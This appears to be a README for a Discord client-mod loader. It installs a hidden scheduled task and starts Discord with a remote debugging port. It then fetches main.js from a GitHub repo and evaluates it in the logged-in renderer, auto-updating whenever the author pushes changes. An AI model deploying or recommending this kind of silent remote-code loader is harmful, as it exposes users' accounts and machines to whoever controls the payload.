# Python3.16 Client

Auto-attaches the Python3.16 client to Discord **at every launch** — no BetterDiscord, no
manual console paste. It pulls the payload from this repo and evaluates it in the Discord
renderer through the Chrome DevTools Protocol (CDP).

## Features

- One-time install, then it just works at every Discord start / reload / update.
- Pulls `version.json` then `main.js` from GitHub, validates the payload, caches it atomically.
- **Hot updates**: if the remote version differs from the live one, it re-injects in place —
  no Discord restart needed.
- Launches Discord with `--remote-debugging-port` (relaunches once only if it was started
  without it), then keeps watching forever.
- Exponential backoff on injection errors; the task stays quiet.
- `doctor.ps1` for a full health report.
- Client UI: RPC rotation, profile tools, game/stream forge, ghost mode, logs, toasts,
  `Ctrl+Shift+P` toggle, `Esc` to tray, update badge.

## How it works

1. `install.ps1` copies everything to `%LOCALAPPDATA%\Python316`.
2. It registers a logon scheduled task (`Python316 Injector`) that runs hidden.
3. The injector:
   - launches Discord with `--remote-debugging-port=9222` (or relaunches once if needed),
   - reads `version.json`, downloads and validates `main.js`, caches it,
   - connects to the page target over CDP and runs `Runtime.evaluate(main.js)`,
   - verifies `window.__python316.__version` before declaring success,
   - re-injects on version change or after any reload/update/relaunch.

Push a new `main.js` + bump `version.json` and every friend updates on their next pass.

## Install (friends)

**Option A — one file**

1. Download `Setup.bat` (or the repo ZIP).
2. Right-click `Setup.bat` → Run. Approve the prompt if Windows shows one.

**Option B — from a clone**

```powershell
git clone https://github.com/testkgj/python316-client
cd python316-client
powershell -NoProfile -ExecutionPolicy Bypass -File .\install.ps1
```

The first attach may restart Discord once — save anything important. After that it is silent.

## Commands

```powershell
.\install.ps1                 # install + schedule + start watcher
.\install.ps1 -NoStartNow     # install + schedule, do not touch Discord now
.\install.ps1 -NoTask         # skip scheduled task (uses Startup folder instead)
.\install.ps1 -Repair         # refresh files, restart the watcher (hot reload)
.\install.ps1 -Status         # run doctor.ps1
.\install.ps1 -Uninstall      # remove everything
.\install.ps1 -RawBase "https://raw.githubusercontent.com/<you>/<repo>/main"
```

## Doctor

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\doctor.ps1
```

Reports config, installed files, cached version, task state, Discord processes, debug port,
CDP target, live version + UI host, and the log tail. Run it first when something is off.

## Repo layout

| File | Purpose |
|------|---------|
| `main.js` | Canonical payload evaluated inside Discord |
| `payload.js` | Legacy v4.1.0 payload (kept for compatibility) |
| `injector.ps1` | Persistent watcher: launch + fetch + validate + CDP inject |
| `install.ps1` | Setup / repair / status / uninstall |
| `uninstall.ps1` | Removes task, startup entry, install dir |
| `doctor.ps1` | Health report |
| `Setup.bat` | Double-click installer |
| `config.json` | Port, payload URL, launch/restart behaviour |
| `version.json` | Version + canonical payload URL |
| `deploy.ps1` | Pushes this folder to GitHub |
| `CHANGELOG.md` | Version history |

## Config

`%LOCALAPPDATA%\Python316\config.json`

```json
{
  "port": 9222,
  "githubRaw": "https://raw.githubusercontent.com/testkgj/python316-client/main/main.js",
  "repoBase": "https://raw.githubusercontent.com/testkgj/python316-client/main",
  "autoLaunch": true,
  "restartExisting": true,
  "pollSeconds": 6
}
```

- `port` — CDP debug port.
- `githubRaw` / `repoBase` — payload + version source.
- `autoLaunch` — start Discord with the port when it is not running.
- `restartExisting` — relaunch Discord once if started without the port.
- `pollSeconds` — watcher interval.

## Files / logs

- Install: `%LOCALAPPDATA%\Python316\`
- Log: `%LOCALAPPDATA%\Python316\injector.log` (last injected version in `last_inject.json`)

## Uninstall

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\install.ps1 -Uninstall
```

Then restart Discord.

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `debug port not reachable` | Discord wasn't started by the loader. Run `install.ps1 -Repair`. |
| `marker missing` | Page not ready yet; injector retries with backoff. Check log. |
| Task exists but never ran | `Get-ScheduledTaskInfo -TaskName "Python316 Injector"` → LastTaskResult. |
| Want a fresh start | `install.ps1 -Uninstall` then `install.ps1`. |
